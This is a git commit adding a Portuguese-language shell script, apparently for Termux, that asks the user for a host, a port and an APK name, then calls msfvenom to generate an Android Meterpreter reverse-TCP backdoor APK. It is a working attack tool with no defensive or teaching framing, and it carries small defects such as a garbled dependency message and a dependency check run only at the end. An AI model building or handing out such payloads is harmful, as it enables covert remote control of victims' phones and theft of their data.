1d8d7d1afc9e9cfd83570c03a5652a2a5af8e4bc
shoowl <71995271+shoowl@users.noreply.github.com>
2020-11-21 20:34:18 -0300

    Create backdoortst.sh

---
+++ backdoortst.sh
@@ -0,0 +1,45 @@
+clear
+
+function dependencias() {
+    command -v figlet > /dev/null 2>&1 || { echo >&2 "você precisa do php instalado, digite: você não tem o figlet instalado, instale para continuar"; exit 1; }
+    
+    command -v cowsay > /dev/null 2>&1 || { echo >&2 "você não tem o cowsay instalado, instale para continuar"; exit 1; }
+    
+    command -v metasploit > /dev/null 2>&1 || { echo >&2 "você não tem o metasploit instalado, instale para continuar"; exit 1; }
+}
+
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mAutor: Senhor-Loock\e[0m\n"
+
+cowsay -f eyes "Hacking" | lolcat
+figlet -f slant "FERRAMENTAS" | lolcat
+
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mlocalhost [H]:" 
+  read host
+
+clear
+
+cowsay -f eyes "Hacking" | lolcat
+figlet -f slant "FERRAMENTAS" | lolcat
+
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mport [P]:\e[0m\n" 
+   read port
+
+clear
+
+cowsay -f eyes "Hacking" | lolcat
+figlet -f slant "FERRAMENTAS" | lolcat
+
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mNome do apk:Exemplo paylaod.apk:\e[0m\n" 
+   read name
+
+clear
+
+cowsay -f eyes "Hacking" | lolcat
+figlet -f slant "FERRAMENTAS" | lolcat
+
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mCriando $name\e[0m\n"
+
+msfvenom -p android/meterpreter/reverse_tcp lhost=$host lport=$port R> /data/data/com.termux/files/home/storage/downloads/$name
+
+
+dependencias
